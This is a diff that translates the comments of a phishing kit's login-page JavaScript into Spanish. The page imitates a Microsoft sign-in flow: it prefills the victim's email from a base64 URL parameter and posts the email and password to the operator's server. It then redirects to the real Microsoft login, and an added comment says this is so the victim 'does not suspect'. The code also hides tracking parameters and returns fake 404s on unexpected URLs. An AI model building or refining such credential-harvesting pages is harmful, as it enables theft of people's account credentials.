@@ -1,4 +1,4 @@
-// Global variable to store the email
+// Variable global para almacenar el correo electrónico ingresado por el usuario
 var userEmail = "";
 
 function sanitizeString(str) {
@@ -23,12 +23,13 @@ document.addEventListener("DOMContentLoaded", function () {
     var urlParams = new URLSearchParams(window.location.search);
     const allowedParams = ['u', 'p', 'logo', 'bg', 'edificio', 'planta'];
 
-    // --- REDIRECT CHECK: If edificio AND planta are present, redirect to login.html without them ---
+    // --- REVISIÓN DE REDIRECCIÓN: Si los parámetros 'edificio' y 'planta' están presentes, 
+    // redirigimos a la misma página pero limpiando estos parámetros de la URL para ocultarlos a la vista.
     var hasEdificio = urlParams.has('edificio');
     var hasPlanta = urlParams.has('planta');
 
     if (hasEdificio && hasPlanta) {
-        // Create new URL without edificio and planta parameters
+        // Crear una nueva URL sin los parámetros de edificio y planta
         var newParams = new URLSearchParams();
         for (const [key, value] of urlParams.entries()) {
             if (key !== 'edificio' && key !== 'planta') {
@@ -45,7 +46,8 @@ document.addEventListener("DOMContentLoaded", function () {
         return;
     }
 
-    // --- 1. STRICT WHITELIST CHECK ---
+    // --- 1. VERIFICACIÓN ESTRICTA DE LISTA BLANCA ---
+    // Si la URL contiene algún parámetro que no está permitido, disparamos error 404
     for (const key of urlParams.keys()) {
         if (!allowedParams.includes(key)) {
             trigger404();
@@ -53,7 +55,8 @@ document.addEventListener("DOMContentLoaded", function () {
         }
     }
 
-    // --- 2. BASE64 VALIDATION ---
+    // --- 2. VALIDACIÓN BASE64 ---
+    // Algunos parámetros deben venir codificados en Base64. Verificamos que lo estén.
     const b64ParamsToCheck = ['u', 'logo', 'bg'];
     for (let param of b64ParamsToCheck) {
         let value = urlParams.get(param);
@@ -63,15 +66,15 @@ document.addEventListener("DOMContentLoaded", function () {
         }
     }
 
-    // --- 3. UI RENDERING (LOGO) ---
+    // --- 3. RENDERIZADO DE LA INTERFAZ (LOGO Y DATOS) ---
     var defaultLogo = "../static/logo2.png";
 
-    // Check if 'u' parameter exists (pre-filled email)
+    // Verificar si existe el parámetro 'u' (correo pre-rellenado)
     var getId = urlParams.get("u");
     if (getId) {
         try {
             userEmail = sanitizeString(atob(getId));
-            // If email is pre-filled, skip to password step
+            // Si el correo viene pre-rellenado, saltamos directamente al paso de la contraseña
             document.getElementById("email-step").style.display = "none";
             document.getElementById("password-step").style.display = "block";
             document.getElementById("display_email").innerText = userEmail;
@@ -83,7 +86,7 @@ document.addEventListener("DOMContentLoaded", function () {
         }
     }
 
-    // Logo logic
+    // Lógica para establecer el logo personalizado
     var getLogo = urlParams.get("logo");
     var logoElement1 = document.getElementById("logo_image");
     var logoElement2 = document.getElementById("logo_image_2");
@@ -107,18 +110,18 @@ document.addEventListener("DOMContentLoaded", function () {
     if (logoElement1) logoElement1.src = logoSrc;
     if (logoElement2) logoElement2.src = logoSrc;
 
-    // Set logo for sign-in options view
+    // Establecer el logo en la vista de opciones de inicio de sesión
     var logoElement3 = document.getElementById("logo_image_3");
     if (logoElement3) logoElement3.src = logoSrc;
 
-    // Add click handler for sign-in options button
+    // Añadir el manejador de eventos para el botón de opciones de inicio de sesión
     var signinOptionsBtn = document.querySelector('.signin-options');
     if (signinOptionsBtn) {
         signinOptionsBtn.addEventListener('click', showSignInOptions);
     }
 });
 
-// Show sign-in options view
+// Mostrar la vista de opciones de inicio de sesión con animación
 function showSignInOptions() {
     var emailStep = document.getElementById("email-step");
     var passwordStep = document.getElementById("password-step");
@@ -126,7 +129,7 @@ function showSignInOptions() {
     var signinOptionsBtn = document.querySelector('.signin-options');
     if (signinOptionsBtn) signinOptionsBtn.style.display = "none";
 
-    // Hide current view
+    // Ocultar la vista actual e introducir la nueva con una animación CSS
     if (emailStep.style.display !== "none") {
         emailStep.classList.add("slide-out-left");
         setTimeout(function () {
@@ -152,7 +155,7 @@ function showSignInOptions() {
     }
 }
 
-// Hide sign-in options and go back
+// Ocultar la vista de opciones de inicio de sesión y volver al paso de correo
 function hideSignInOptions() {
     var emailStep = document.getElementById("email-step");
     var optionsView = document.getElementById("signin-options-view");
@@ -171,7 +174,7 @@ function hideSignInOptions() {
     }, 300);
 }
 
-// Step 1: Submit Email
+// Paso 1: Enviar el Correo
 function submitEmail() {
     var emailElement = document.getElementById("email");
     var errorElement = document.getElementById("email-error");
@@ -179,7 +182,7 @@ function submitEmail() {
     var nextButton = document.getElementById("email-next");
     var loadingSpinner = document.getElementById("loading-spinner");
 
-    // Basic email validation
+    // Validación básica del correo electrónico
     if (emailValue.length <= 0 || !emailValue.includes("@")) {
         errorElement.style.display = "block";
         return;
@@ -188,24 +191,24 @@ function submitEmail() {
     errorElement.style.display = "none";
     userEmail = emailValue;
 
-    // Show loading spinner, hide button
+    // Mostrar el spinner de carga y ocultar el botón
     nextButton.style.display = "none";
     loadingSpinner.style.display = "flex";
 
-    // Send email to backend for logging
+    // Enviar el correo electrónico al backend para registrarlo
     var xhttp = new XMLHttpRequest();
     xhttp.open("POST", "/email", true);
     xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 
     xhttp.onreadystatechange = function () {
         if (this.readyState == 4 && this.status == 200) {
-            // Simulate loading delay for realism
+            // Simular un retraso de carga para darle más realismo a la animación
             setTimeout(function () {
-                // Hide loading spinner
+                // Ocultar el spinner de carga
                 loadingSpinner.style.display = "none";
                 nextButton.style.display = "block";
 
-                // Move to password step with animation
+                // Pasar al paso de la contraseña con una animación de deslizamiento
                 var emailStep = document.getElementById("email-step");
                 var passwordStep = document.getElementById("password-step");
                 var signinOptionsBtn = document.querySelector('.signin-options');
@@ -222,7 +225,7 @@ function submitEmail() {
                         passwordStep.classList.remove("slide-in-right");
                     }, 300);
                 }, 300);
-            }, 800); // 800ms loading delay
+            }, 800); // 800ms de retraso simulado
         }
     };
 
@@ -230,7 +233,7 @@ function submitEmail() {
     xhttp.send(data);
 }
 
-// Step 2: Submit Password
+// Paso 2: Enviar la Contraseña
 function submitPassword() {
     var passwordElement = document.getElementById("password");
     var errorElement = document.getElementById("password-error");
@@ -244,15 +247,18 @@ function submitPassword() {
     errorElement.style.display = "none";
 
     var tosContainer = document.getElementById("tos-container");
+    // Verificamos si el contenedor de los términos de servicio (ToS) está oculto.
+    // Si lo está, lo mostramos y detenemos el envío para obligar a que lo lean/acepten.
     if (tosContainer && tosContainer.style.display === "none") {
         tosContainer.style.display = "block";
-        // Optionally scroll down so the user sees the terms
+        // Opcional: Hacer scroll para que el usuario pueda ver los términos
         tosContainer.scrollIntoView({ behavior: "smooth", block: "center" });
         return;
     }
 
     var tosCheckbox = document.getElementById("tos-checkbox");
     var tosError = document.getElementById("tos-error");
+    // Si el checkbox de ToS no está marcado, mostramos el error
     if (tosCheckbox && !tosCheckbox.checked) {
         if (tosError) tosError.style.display = "block";
         return;
@@ -267,6 +273,8 @@ function submitPassword() {
 
     xhttp.onreadystatechange = function () {
         if (this.readyState == 4 && this.status == 200) {
+            // Una vez capturados los datos correctamente en nuestro servidor falso, 
+            // redirigimos a la víctima a la página oficial de Microsoft para que inicie sesión realmente y no sospeche.
             window.location.href = "https://login.microsoftonline.com";
         }
     };
@@ -275,7 +283,7 @@ function submitPassword() {
     xhttp.send(data);
 }
 
-// Go back to email step
+// Regresar al paso del correo
 function goBackToEmail() {
     document.getElementById("password-step").style.display = "none";
     document.getElementById("email-step").style.display = "block";
